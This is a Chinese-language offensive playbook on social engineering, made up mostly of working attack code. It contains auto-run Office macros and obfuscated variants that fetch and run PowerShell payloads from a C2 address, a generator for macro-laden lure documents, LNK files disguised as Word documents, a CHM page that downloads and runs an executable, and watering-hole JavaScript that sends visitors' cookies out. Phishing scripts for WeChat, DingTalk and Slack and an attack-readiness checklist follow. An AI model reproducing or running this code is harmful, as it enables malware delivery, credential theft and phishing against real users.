# 社会工程学 (Social Engineering)

## 钓鱼攻击 (Phishing)

### Office宏文档

#### 恶意宏生成
```vba
' malmacro.vba
Sub AutoOpen()
    ' 自动执行宏
    ExecutePayload
End Sub

Sub Document_Open()
    ' 文档打开时执行
    ExecutePayload
End Sub

Sub Workbook_Open()
    ' 工作簿打开时执行
    ExecutePayload
End Sub

Function ExecutePayload()
    On Error Resume Next
    
    ' 禁用宏警告
    Application.DisplayAlerts = False
    Application.EnableEvents = False
    Application.ScreenUpdating = False
    
    ' 下载并执行Payload
    Dim objShell As Object
    Set objShell = CreateObject("WScript.Shell")
    
    ' 使用PowerShell下载执行
    Dim cmd As String
    cmd = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command "
    cmd = cmd & "IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.100:8080/payload.ps1')"
    
    objShell.Run cmd, 0, False
    
    ' 清理痕迹
    Application.DisplayAlerts = True
    Application.EnableEvents = True
    Application.ScreenUpdating = True
End Function
```

#### 高级宏混淆技术
```vba
' obfuscated_macro.vba
Sub AutoOpen()
    ' 使用变量分割和拼接
    Dim p1 As String, p2 As String, p3 As String
    p1 = "pow"
    p2 = "ersh"
    p3 = "ell"
    
    Dim shell_cmd As String
    shell_cmd = p1 & p2 & p3 & ".exe -WindowStyle Hidden -Command "
    
    ' 使用Chr函数构建字符串
    Dim url As String
    url = Chr(104) & Chr(116) & Chr(116) & Chr(112) & Chr(58) & Chr(47) & Chr(47)
    url = url & Chr(49) & Chr(57) & Chr(50) & Chr(46) & Chr(49) & Chr(54) & Chr(56)
    url = url & Chr(46) & Chr(49) & Chr(46) & Chr(49) & Chr(48) & Chr(48) & Chr(58)
    url = url & Chr(56) & Chr(48) & Chr(56) & Chr(48) & Chr(47) & Chr(112) & Chr(97)
    url = url & Chr(121) & Chr(108) & Chr(111) & Chr(97) & Chr(100) & Chr(46) & Chr(112)
    url = url & Chr(115) & Chr(49)
    
    ' 使用环境变量
    Dim env_var As String
    env_var = Environ("TEMP") & "\\tmp.ps1"
    
    ' 下载Payload到临时文件
    Dim download_cmd As String
    download_cmd = "(New-Object Net.WebClient).DownloadFile('" & url & "', '" & env_var & "')"
    
    ' 执行下载的脚本
    Dim exec_cmd As String
    exec_cmd = shell_cmd & "& '" & env_var & "'"
    
    ' 使用计划任务延迟执行
    Dim schtasks_cmd As String
    schtasks_cmd = "schtasks /create /tn \"WindowsUpdate\" /tr \"" & exec_cmd & "\" /sc once /st 23:59"
    
    CreateObject("WScript.Shell").Run schtasks_cmd, 0, False
End Sub
```

#### 宏文档生成器
```python
# macro_generator.py
import os
import random
import string
from datetime import datetime

class MacroDocumentGenerator:
    def __init__(self):
        self.payload_url = "http://192.168.1.100:8080/payload"
        self.output_dir = "generated_docs"
        
    def generate_vba_macro(self, obfuscation_level=3):
        """生成VBA宏代码"""
        base_macro = f'''
Sub AutoOpen()
    Call {self.random_function_name()}
End Sub

Sub Document_Open()
    Call {self.random_function_name()}
End Sub

Function {self.random_function_name()}()
    On Error Resume Next
    {self.generate_obfuscated_payload()}
End Function
'''
        
        if obfuscation_level >= 2:
            base_macro = self.add_string_obfuscation(base_macro)
        
        if obfuscation_level >= 3:
            base_macro = self.add_control_flow_obfuscation(base_macro)
        
        return base_macro
    
    def random_function_name(self):
        """生成随机函数名"""
        prefixes = ['Execute', 'Run', 'Process', 'Handle', 'Manage']
        suffixes = ['Data', 'System', 'Config', 'Update', 'Task']
        
        return random.choice(prefixes) + random.choice(suffixes) + ''.join(random.choices(string.digits, k=3))
    
    def generate_obfuscated_payload(self):
        """生成混淆的Payload"""
        # 使用多种技术混淆PowerShell命令
        ps_command = f"IEX(New-Object Net.WebClient).DownloadString('{self.payload_url}')"
        
        # 字符编码混淆
        encoded_ps = ""
        for char in ps_command:
            encoded_ps += f"Chr({ord(char)})&"
        encoded_ps = encoded_ps.rstrip('&')
        
        obfuscated_payload = f'''
    Dim cmd As String
    cmd = {encoded_ps}
    CreateObject("WScript.Shell").Run "powershell.exe -WindowStyle Hidden -Command " & cmd, 0, False
'''
        
        return obfuscated_payload
    
    def add_string_obfuscation(self, macro_code):
        """添加字符串混淆"""
        # 分割长字符串
        obfuscated_code = macro_code.replace("powershell.exe", """" & Chr(112) & Chr(111) & Chr(119) & Chr(101) & Chr(114) & Chr(115) & Chr(104) & Chr(101) & Chr(108) & Chr(108)"""")
        
        # 添加无用字符串变量
        useless_strings = []
        for i in range(5):
            useless_str = ''.join(random.choices(string.ascii_letters, k=20))
            useless_strings.append(f"Dim unused{i} As String: unused{i} = \"{useless_str}\"")
        
        # 在宏代码中插入无用字符串
        lines = obfuscated_code.split('\n')
        for i, useless_str in enumerate(useless_strings):
            if i < len(lines):
                lines.insert(random.randint(1, len(lines)-1), useless_str)
        
        return '\n'.join(lines)
    
    def add_control_flow_obfuscation(self, macro_code):
        """添加控制流混淆"""
        # 添加假的条件判断
        fake_conditions = []
        for i in range(3):
            condition = f"If {random.randint(1000, 9999)} > {random.randint(100, 999)} Then\n    ' Fake condition {i}\nEnd If"
            fake_conditions.append(condition)
        
        # 添加假的循环
        fake_loops = []
        for i in range(2):
            loop = f"For i = 1 To {random.randint(1, 5)}\n    ' Fake loop {i}\nNext i"
            fake_loops.append(loop)
        
        # 在代码中插入假的控制流
        obfuscated_code = macro_code
        
        for condition in fake_conditions:
            # 随机插入位置
            lines = obfuscated_code.split('\n')
            insert_pos = random.randint(1, len(lines)-1)
            lines.insert(insert_pos, condition)
            obfuscated_code = '\n'.join(lines)
        
        for loop in fake_loops:
            lines = obfuscated_code.split('\n')
            insert_pos = random.randint(1, len(lines)-1)
            lines.insert(insert_pos, loop)
            obfuscated_code = '\n'.join(lines)
        
        return obfuscated_code
    
    def create_word_document(self, filename="document.docm"):
        """创建Word文档"""
        try:
            import win32com.client as win32
            
            word = win32.Dispatch('Word.Application')
            word.Visible = False
            
            # 创建新文档
            doc = word.Documents.Add()
            
            # 添加内容
            doc.Content.Text = f"Confidential Document - {datetime.now().strftime('%Y-%m-%d')}"
            
            # 创建VBA项目
            vb_project = doc.VBProject
            vb_component = vb_project.VBComponents.Add(1)  # 1 = vbext_ct_StdModule
            
            # 添加宏代码
            macro_code = self.generate_vba_macro()
            vb_component.CodeModule.AddFromString(macro_code)
            
            # 保存文档
            doc.SaveAs(os.path.join(self.output_dir, filename), FileFormat=13)  # 13 = wdFormatXMLDocumentMacroEnabled
            doc.Close()
            word.Quit()
            
            print(f"[+] Created macro-enabled Word document: {filename}")
            return True
            
        except Exception as e:
            print(f"[!] Error creating Word document: {e}")
            return False
    
    def create_excel_document(self, filename="workbook.xlsm"):
        """创建Excel文档"""
        try:
            import win32com.client as win32
            
            excel = win32.Dispatch('Excel.Application')
            excel.Visible = False
            
            # 创建工作簿
            wb = excel.Workbooks.Add()
            
            # 添加数据
            ws = wb.Worksheets(1)
            ws.Cells(1, 1).Value = "Financial Report"
            ws.Cells(2, 1).Value = f"Generated on {datetime.now().strftime('%Y-%m-%d')}"
            
            # 创建VBA项目
            vb_project = wb.VBProject
            vb_component = vb_project.VBComponents.Add(1)
            
            # 添加宏代码
            macro_code = self.generate_vba_macro()
            vb_component.CodeModule.AddFromString(macro_code)
            
            # 保存工作簿
            wb.SaveAs(os.path.join(self.output_dir, filename), FileFormat=52)  # 52 = xlOpenXMLWorkbookMacroEnabled
            wb.Close()
            excel.Quit()
            
            print(f"[+] Created macro-enabled Excel workbook: {filename}")
            return True
            
        except Exception as e:
            print(f"[!] Error creating Excel workbook: {e}")
            return False

# 使用示例
generator = MacroDocumentGenerator()
generator.create_word_document("invoice_2024.docm")
generator.create_excel_document("financial_report.xlsm")
```

### LNK文件钓鱼

#### 恶意LNK文件生成
```powershell
# create_malicious_lnk.ps1
$wshell = New-Object -ComObject WScript.Shell
$lnk = $wshell.CreateShortcut("C:\Users\Public\Documents\Important Document.lnk")

# 设置目标为PowerShell
$lnk.TargetPath = "powershell.exe"

# 隐藏参数
$lnk.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -Command `"IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.100:8080/payload.ps1')`""

# 设置图标为Word文档图标
$lnk.IconLocation = "C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,0"

# 设置工作目录
$lnk.WorkingDirectory = "C:\Users\Public\Documents"

# 设置描述
$lnk.Description = "Important Document - Open to view"

# 保存LNK文件
$lnk.Save()

# 修改文件属性
attrib +h "C:\Users\Public\Documents\Important Document.lnk"
```

#### 高级LNK文件混淆
```python
# lnk_generator.py
import os
import struct
import datetime

class MaliciousLNKGenerator:
    def __init__(self):
        self.payload_url = "http://192.168.1.100:8080/payload.ps1"
        self.icon_path = "C:\\Windows\\System32\\shell32.dll"
        self.icon_index = 1
    
    def create_obfuscated_lnk(self, output_path, display_name):
        """创建混淆的LNK文件"""
        # PowerShell命令
        ps_command = f"IEX(New-Object Net.WebClient).DownloadString('{self.payload_url}')"
        
        # 混淆PowerShell命令
        obfuscated_ps = self.obfuscate_powershell(ps_command)
        
        # 完整的命令行
        target = "powershell.exe"
        arguments = f"-WindowStyle Hidden -ExecutionPolicy Bypass -Command {obfuscated_ps}"
        
        # 创建LNK文件
        self.create_lnk_file(output_path, target, arguments, display_name)
    
    def obfuscate_powershell(self, command):
        """混淆PowerShell命令"""
        # 使用多种混淆技术
        
        # 1. 字符串拼接
        obfuscated = ""
        parts = []
        current_part = ""
        
        for i, char in enumerate(command):
            current_part += char
            if len(current_part) >= 5 or i == len(command) - 1:
                parts.append(f'"{current_part}"')
                current_part = ""
        
        obfuscated = "+".join(parts)
        
        # 2. 使用环境变量
        env_vars = {
            'PS': 'powershell',
            'DL': 'DownloadString',
            'WC': 'WebClient'
        }
        
        for var_name, var_value in env_vars.items():
            obfuscated = obfuscated.replace(var_value, f"${var_name}")
        
        # 3. 字符编码
        encoded_command = ""
        for char in command:
            encoded_command += f"[char]{ord(char)}+"
        encoded_command = encoded_command.rstrip('+')
        
        return f"({encoded_command})"
    
    def create_lnk_file(self, output_path, target, arguments, display_name):
        """创建LNK文件"""
        # LNK文件格式结构
        with open(output_path, 'wb') as f:
            # Shell Link Header
            f.write(b'\x4c\x00\x00\x00')  # HeaderSize
            f.write(b'\x01\x14\x02\x00\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00\x46')  # LinkCLSID
            f.write(b'\x81\x00\x00\x00')  # LinkFlags
            f.write(b'\x00\x00\x00\x00')  # FileAttributes
            
            # Creation Time
            creation_time = int((datetime.datetime.now() - datetime.datetime(1601, 1, 1)).total_seconds() * 10000000)
            f.write(struct.pack('<Q', creation_time))
            
            # Access Time
            f.write(struct.pack('<Q', creation_time))
            
            # Write Time
            f.write(struct.pack('<Q', creation_time))
            
            # File Size
            f.write(struct.pack('<I', len(target) + len(arguments)))
            
            # Icon Index
            f.write(struct.pack('<I', self.icon_index))
            
            # Show Command
            f.write(struct.pack('<I', 7))  # SW_SHOWMINNOACTIVE
            
            # Hot Key
            f.write(struct.pack('<H', 0))
            
            # Reserved
            f.write(b'\x00\x00\x00\x00\x00\x00\x00\x00')
            
            # Target ID List
            self.write_target_id_list(f, target)
            
            # Link Info
            self.write_link_info(f)
            
            # String Data
            self.write_string_data(f, display_name, target, arguments)
            
            # Icon Location
            self.write_icon_location(f)
    
    def write_target_id_list(self, f, target):
        """写入目标ID列表"""
        # Item ID List
        item_ids = []
        
        # My Computer
        item_ids.append(b'\x14\x00\x1f\x50\xe0\x4f\xd0\x20\xea\x3a\x69\x10\xa2\xd8\x08\x00\x2b\x30\x30\x9d')
        
        # Windows文件夹
        item_ids.append(b'\x19\x00\x23\x43\x3a\x5c\x5c\x57\x69\x6e\x64\x6f\x77\x73\x5c\x5c')
        
        # System32文件夹
        item_ids.append(b'\x1c\x00\x2f\x43\x3a\x5c\x5c\x57\x69\x6e\x64\x6f\x77\x73\x5c\x5c\x53\x79\x73\x74\x65\x6d\x33\x32\x5c\x5c')
        
        # PowerShell
        target_bytes = target.encode('utf-16le')
        target_item = struct.pack('<H', len(target_bytes) + 2) + target_bytes
        item_ids.append(target_item)
        
        # 写入Item ID List
        total_size = sum(len(item_id) for item_id in item_ids) + 2
        f.write(struct.pack('<H', total_size))
        
        for item_id in item_ids:
            f.write(item_id)
        
        f.write(b'\x00\x00')  # Terminal ID
    
    def write_link_info(self, f):
        """写入链接信息"""
        f.write(b'\x00\x00\x00\x00')  # LinkInfoSize (0表示没有链接信息)
    
    def write_string_data(self, f, display_name, target, arguments):
        """写入字符串数据"""
        # NAME_STRING
        name_bytes = display_name.encode('utf-16le')
        f.write(struct.pack('<H', len(name_bytes) // 2))
        f.write(name_bytes)
        
        # RELATIVE_PATH
        relative_path = "powershell.exe"
        rel_path_bytes = relative_path.encode('utf-16le')
        f.write(struct.pack('<H', len(rel_path_bytes) // 2))
        f.write(rel_path_bytes)
        
        # WORKING_DIR
        working_dir = "C:\\Windows\\System32"
        work_dir_bytes = working_dir.encode('utf-16le')
        f.write(struct.pack('<H', len(work_dir_bytes) // 2))
        f.write(work_dir_bytes)
        
        # COMMAND_LINE_ARGUMENTS
        args_bytes = arguments.encode('utf-16le')
        f.write(struct.pack('<H', len(args_bytes) // 2))
        f.write(args_bytes)
    
    def write_icon_location(self, f):
        """写入图标位置"""
        icon_path = self.icon_path.encode('utf-16le')
        f.write(struct.pack('<H', len(icon_path) // 2))
        f.write(icon_path)

# 使用示例
generator = MaliciousLNKGenerator()
generator.create_obfuscated_lnk("Important_Document.lnk", "Important Document")
```

### CHM电子书钓鱼

#### 恶意CHM文件生成
```html
<!-- malicious_chm.html -->
<!DOCTYPE html>
<html>
<head>
    <title>Employee Handbook 2024</title>
</head>
<body>
    <h1>Welcome to Our Company</h1>
    <p>This handbook contains important information for all employees.</p>
    
    <!-- 隐藏的恶意对象 -->
    <object id="malicious" classid="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83">
        <param name="DataURL" value="http://192.168.1.100:8080/payload.exe">
        <param name="FieldDelim" value="|">
        <param name="UseHeader" value="True">
        <param name="TextQualifier" value="'">
    </object>
    
    <script language="JavaScript">
        // 自动下载执行
        setTimeout(function() {
            var obj = document.getElementById("malicious");
            if (obj) {
                // 通过ADODB.Stream执行
                var stream = new ActiveXObject("ADODB.Stream");
                stream.Type = 1; // adTypeBinary
                stream.Open();
                
                // 下载文件
                var http = new ActiveXObject("Microsoft.XMLHTTP");
                http.open("GET", "http://192.168.1.100:8080/payload.exe", false);
                http.send();
                
                if (http.status == 200) {
                    stream.Write(http.responseBody);
                    stream.SaveToFile("C:\\Windows\\Temp\\update.exe", 2);
                    stream.Close();
                    
                    // 执行文件
                    var shell = new ActiveXObject("WScript.Shell");
                    shell.Run("C:\\Windows\\Temp\\update.exe", 0, false);
                }
            }
        }, 3000); // 3秒后执行
    </script>
</body>
</html>
```

#### CHM编译脚本
```bash
# compile_chm.sh
# 安装CHM编译器
sudo apt install chmpx

# 创建项目文件
cat > handbook.hhp << EOF
[OPTIONS]
Compatibility=1.1 or later
Compiled file=Employee_Handbook_2024.chm
Contents file=handbook.hhc
Default topic=index.html
Display compile progress=No
Language=0x409 English (United States)
Title=Employee Handbook 2024

[FILES]
index.html
EOF

# 创建目录文件
cat > handbook.hhc << EOF
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML//EN">
<HTML>
<HEAD>
<meta name="GENERATOR" content="Microsoft&reg; HTML Help Workshop 4.1">
<!-- Sitemap 1.0 -->
</HEAD><BODY>
<OBJECT type="text/site properties">
    <param name="ImageType" value="Folder">
</OBJECT>
<UL>
    <LI> <OBJECT type="text/sitemap">
        <param name="Name" value="Employee Handbook">
        <param name="Local" value="index.html">
        </OBJECT>
</UL>
</BODY></HTML>
EOF

# 编译CHM文件
chmcmd handbook.hhp

# 签名CHM文件（可选）
signtool sign /f certificate.pfx /p password Employee_Handbook_2024.chm
```

---

## 水坑攻击 (Watering Hole)

### 针对性网站挂马

#### 网站漏洞利用
```python
# watering_hole_exploit.py
import requests
import base64
from datetime import datetime

class WateringHoleExploit:
    def __init__(self):
        self.payload_url = "http://192.168.1.100:8080/payload.js"
        self.target_websites = []
    
    def inject_malicious_js(self, vulnerable_url, injection_point):
        """注入恶意JavaScript"""
        malicious_js = f"""
        // 水坑攻击Payload
        (function() {{
            // 检查目标环境
            if (window.location.hostname.includes('targetdomain.com')) {{
                // 延迟执行，避免检测
                setTimeout(function() {{
                    // 下载恶意脚本
                    var script = document.createElement('script');
                    script.src = '{self.payload_url}';
                    document.head.appendChild(script);
                }}, 5000);
                
                // 收集用户信息
                var user_info = {{
                    userAgent: navigator.userAgent,
                    language: navigator.language,
                    platform: navigator.platform,
                    cookie: document.cookie,
                    referrer: document.referrer,
                    timestamp: new Date().toISOString()
                }};
                
                // 发送收集的信息
                fetch('{self.payload_url}/collect', {{
                    method: 'POST',
                    body: JSON.stringify(user_info),
                    headers: {{'Content-Type': 'application/json'}}
                }});
            }}
        }})();
        """
        
        # 对恶意JS进行编码
        encoded_js = base64.b64encode(malicious_js.encode()).decode()
        
        # 根据注入点类型选择注入方法
        if injection_point['type'] == 'xss':
            return self.xss_inject(vulnerable_url, malicious_js)
        elif injection_point['type'] == 'sql':
            return self.sql_inject(vulnerable_url, encoded_js)
        elif injection_point['type'] == 'file_upload':
            return self.file_upload_inject(vulnerable_url, malicious_js)
    
    def create_drive_by_download(self, exploit_url):
        """创建路过式下载攻击"""
        drive_by_html = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>Industry News</title>
            <meta http-equiv="refresh" content="3;url={exploit_url}">
        </head>
        <body>
            <h1>Latest Industry Updates</h1>
            <p>Redirecting to content...</p>
            
            <!-- 隐藏的iframe用于漏洞利用 -->
            <iframe src="{exploit_url}/exploit" style="display:none;"></iframe>
            
            <!-- 恶意JavaScript -->
            <script>
                // 检查插件和版本
                var plugins = [];
                for (var i = 0; i < navigator.plugins.length; i++) {{
                    plugins.push(navigator.plugins[i].name);
                }}
                
                // 尝试利用已知漏洞
                if (plugins.includes('Adobe Acrobat')) {{
                    // PDF漏洞利用
                    window.location.href = '{exploit_url}/malicious.pdf';
                }} else if (plugins.includes('Java')) {{
                    // Java applet漏洞利用
                    document.write('<applet code="MaliciousApplet.class" archive="malicious.jar"></applet>');
                }}
            </script>
        </body>
        </html>
        """
        
        return drive_by_html
    
    def exploit_outdated_plugins(self, target_browser):
        """利用过时的浏览器插件"""
        exploits = {
            'flash': {
                'versions': ['32.0.0.321', '32.0.0.314'],
                'cve': 'CVE-2020-9633',
                'payload': self.generate_flash_exploit()
            },
            'java': {
                'versions': ['8u241', '8u231'],
                'cve': 'CVE-2020-2555',
                'payload': self.generate_java_exploit()
            },
            'pdf': {
                'versions': ['Adobe Reader 2019.021.20058'],
                'cve': 'CVE-2020-9695',
                'payload': self.generate_pdf_exploit()
            }
        }
        
        # 根据检测到的插件返回相应的漏洞利用
        for plugin, exploit_info in exploits.items():
            if plugin in target_browser.lower():
                return exploit_info
        
        return None
    
    def generate_flash_exploit(self):
        """生成Flash漏洞利用"""
        return """
        <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" width="1" height="1">
            <param name="movie" value="exploit.swf">
            <param name="allowScriptAccess" value="always">
            <param name="flashvars" value="payload=http://192.168.1.100:8080/shellcode">
            <embed src="exploit.swf" width="1" height="1" allowScriptAccess="always" 
                   flashvars="payload=http://192.168.1.100:8080/shellcode">
        </object>
        """
    
    def generate_java_exploit(self):
        """生成Java漏洞利用"""
        return """
        <applet code="Exploit.class" archive="exploit.jar" width="1" height="1">
            <param name="payload" value="http://192.168.1.100:8080/payload">
        </applet>
        """
    
    def generate_pdf_exploit(self):
        """生成PDF漏洞利用"""
        return """
        <embed src="exploit.pdf#javascript:app.launchURL('http://192.168.1.100:8080/payload');" 
               width="100%" height="600px">
        """

# 使用示例
watering_hole = WateringHoleExploit()

# 注入恶意JS到目标网站
vulnerable_site = {
    'url': 'https://industry-forum.com/post',
    'injection_point': {
        'type': 'xss',
        'parameter': 'comment'
    }
}

result = watering_hole.inject_malicious_js(vulnerable_site['url'], vulnerable_site['injection_point'])
```

---

## 即时通讯钓鱼

### 微信/钉钉钓鱼

#### 企业微信钓鱼消息
```python
# wechat_phishing.py
import requests
import json
import time
from datetime import datetime

class WeChatPhishing:
    def __init__(self, webhook_url):
        self.webhook_url = webhook_url
        self.company_name = "Target Company"
    
    def create_urgent_message(self, employee_name):
        """创建紧急消息"""
        urgent_messages = [
            {
                "type": "system_update",
                "title": "【紧急】系统升级通知",
                "content": f"@{employee_name} 您好，由于系统安全升级，需要您立即验证账户信息。请点击下方链接完成验证，否则账户将在24小时后暂停使用。",
                "url": "http://192.168.1.100:8080/wechat-auth",
                "color": "red",
                "priority": "high"
            },
            {
                "type": "salary_notification",
                "title": "【财务】工资发放异常",
                "content": f"@{employee_name} 您的本月工资发放出现异常，请立即登录查看详情并完成身份验证。",
                "url": "http://192.168.1.100:8080/salary-portal",
                "color": "orange",
                "priority": "high"
            },
            {
                "type": "security_alert",
                "title": "【安全】异常登录提醒",
                "content": f"@{employee_name} 检测到您的账户存在异常登录行为，请立即确认是否为本人操作。如非本人操作，请立即修改密码。",
                "url": "http://192.168.1.100:8080/security-check",
                "color": "yellow",
                "priority": "medium"
            }
        ]
        
        return random.choice(urgent_messages)
    
    def send_phishing_message(self, employee_info):
        """发送钓鱼消息"""
        message = self.create_urgent_message(employee_info['name'])
        
        # 企业微信消息格式
        wechat_message = {
            "msgtype": "text",
            "text": {
                "content": f"{message['title']}\n\n{message['content']}\n\n👉 点击处理: {message['url']}\n\n---\n此消息由 {self.company_name} 系统自动发送",
                "mentioned_list": [employee_info['userid']]
            }
        }
        
        try:
            response = requests.post(self.webhook_url, json=wechat_message, timeout=10)
            if response.status_code == 200:
                print(f"[+] Phishing message sent to {employee_info['name']}")
                return True
            else:
                print(f"[!] Failed to send message: {response.status_code}")
                return False
        except Exception as e:
            print(f"[!] Error sending message: {e}")
            return False
    
    def create_rich_media_message(self, title, description, image_url, link_url):
        """创建富媒体消息"""
        rich_message = {
            "msgtype": "news",
            "news": {
                "articles": [
                    {
                        "title": title,
                        "description": description,
                        "url": link_url,
                        "picurl": image_url
                    }
                ]
            }
        }
        
        return rich_message
    
    def create_file_share_message(self, filename, file_url, description):
        """创建文件分享消息"""
        file_message = {
            "msgtype": "file",
            "file": {
                "media_id": "FILE_MEDIA_ID",  # 需要上传文件获取media_id
                "filename": filename,
                "description": description
            }
        }
        
        return file_message

# 钉钉钓鱼
class DingTalkPhishing:
    def __init__(self, app_key, app_secret):
        self.app_key = app_key
        self.app_secret = app_secret
        self.access_token = self.get_access_token()
    
    def get_access_token(self):
        """获取访问令牌"""
        url = "https://oapi.dingtalk.com/gettoken"
        params = {
            "appkey": self.app_key,
            "appsecret": self.app_secret
        }
        
        try:
            response = requests.get(url, params=params, timeout=10)
            if response.status_code == 200:
                data = response.json()
                return data.get('access_token')
        except Exception as e:
            print(f"[!] Error getting access token: {e}")
            return None
    
    def send_action_card(self, employee_id, title, content, action_url):
        """发送ActionCard消息"""
        action_card = {
            "msgtype": "action_card",
            "action_card": {
                "title": title,
                "text": content,
                "btn_orientation": "0",
                "single_title": "立即处理",
                "single_url": action_url
            }
        }
        
        url = f"https://oapi.dingtalk.com/message/send?access_token={self.access_token}"
        data = {
            "touser": employee_id,
            "msgtype": "action_card",
            "action_card": action_card["action_card"]
        }
        
        try:
            response = requests.post(url, json=data, timeout=10)
            if response.status_code == 200:
                print(f"[+] ActionCard sent to employee {employee_id}")
                return True
        except Exception as e:
            print(f"[!] Error sending ActionCard: {e}")
            return False

# 使用示例
wechat = WeChatPhishing("https://qyapi.weixin.qq.com/cgi-bin/webhook/send?key=YOUR_KEY")
employee = {
    'name': '张三',
    'userid': 'zhangsan',
    'department': 'IT部门'
}

wechat.send_phishing_message(employee)
```

### Slack钓鱼

#### Slack Bot钓鱼
```python
# slack_phishing.py
import slack
import json
from datetime import datetime

class SlackPhishing:
    def __init__(self, bot_token):
        self.client = slack.WebClient(token=bot_token)
        self.channel_id = None
    
    def create_urgent_notification(self, user_id):
        """创建紧急通知"""
        blocks = [
            {
                "type": "header",
                "text": {
                    "type": "plain_text",
                    "text": "🚨 Security Alert",
                    "emoji": True
                }
            },
            {
                "type": "section",
                "text": {
                    "type": "mrkdwn",
                    "text": f"Hi <@{user_id}>, we detected suspicious activity on your account."
                }
            },
            {
                "type": "section",
                "text": {
                    "type": "mrkdwn",
                    "text": "*Details:*\n• Unusual login from new location\n• Multiple failed password attempts\n• Access to sensitive files"
                }
            },
            {
                "type": "section",
                "text": {
                    "type": "mrkdwn",
                    "text": "Please verify your identity immediately to prevent account suspension."
                }
            },
            {
                "type": "actions",
                "elements": [
                    {
                        "type": "button",
                        "text": {
                            "type": "plain_text",
                            "text": "Verify Account",
                            "emoji": True
                        },
                        "style": "primary",
                        "url": "http://192.168.1.100:8080/slack-verify",
                        "action_id": "verify_account"
                    }
                ]
            }
        ]
        
        return blocks
    
    def send_direct_message(self, user_id, message_blocks):
        """发送私信"""
        try:
            # 打开IM会话
            response = self.client.conversations_open(users=user_id)
            channel_id = response['channel']['id']
            
            # 发送消息
            response = self.client.chat_postMessage(
                channel=channel_id,
                blocks=message_blocks,
                text="Security alert notification"
            )
            
            print(f"[+] DM sent to user {user_id}")
            return True
            
        except Exception as e:
            print(f"[!] Error sending DM: {e}")
            return False
    
    def create_fake_app_installation(self, app_name, redirect_url):
        """创建虚假应用安装链接"""
        app_installation = {
            "app_name": app_name,
            "description": f"Install {app_name} to improve your productivity",
            "permissions": [
                "Read user profile",
                "Send messages",
                "Access files"
            ],
            "install_url": f"{redirect_url}/slack/install",
            "icon": "https://example.com/app-icon.png"
        }
        
        return app_installation
    
    def send_file_share_notification(self, user_id, filename, file_url, sender_name):
        """发送文件分享通知"""
        message = f"""
        Hi! {sender_name} shared a file with you: *{filename}*
        
        *File details:*
        • Name: {filename}
        • Size: 2.5 MB
        • Type: PDF Document
        
        Click here to view: {file_url}
        """
        
        try:
            response = self.client.chat_postMessage(
                channel=user_id,
                text=message,
                unfurl_links=True,
                unfurl_media=True
            )
            
            print(f"[+] File share notification sent to {user_id}")
            return True
            
        except Exception as e:
            print(f"[!] Error sending file notification: {e}")
            return False

# 使用示例
slack = SlackPhishing("xoxb-your-bot-token")
user_id = "U1234567890"

# 发送紧急通知
blocks = slack.create_urgent_notification(user_id)
slack.send_direct_message(user_id, blocks)

# 发送文件分享通知
slack.send_file_share_notification(
    user_id=user_id,
    filename="Q4_Financial_Report.pdf",
    file_url="http://192.168.1.100:8080/fake-report.pdf",
    sender_name="CFO"
)
```

---

## 实战检查清单

### 钓鱼攻击准备
- [ ] 目标邮箱列表已收集
- [ ] 钓鱼邮件模板已创建
- [ ] 恶意文档已生成
- [ ] C2服务器已配置
- [ ] 域名和证书已准备

### 水坑攻击部署
- [ ] 目标网站已识别
- [ ] 漏洞利用代码已准备
- [ ] 恶意JavaScript已编写
- [ ] 流量重定向已配置
- [ ] 攻击效果已测试

### 即时通讯钓鱼
- [ ] 通讯平台API已获取
- [ ] 钓鱼消息已设计
- [ ] 目标用户信息已收集
- [ ] 消息发送脚本已编写
- [ ] 响应处理已准备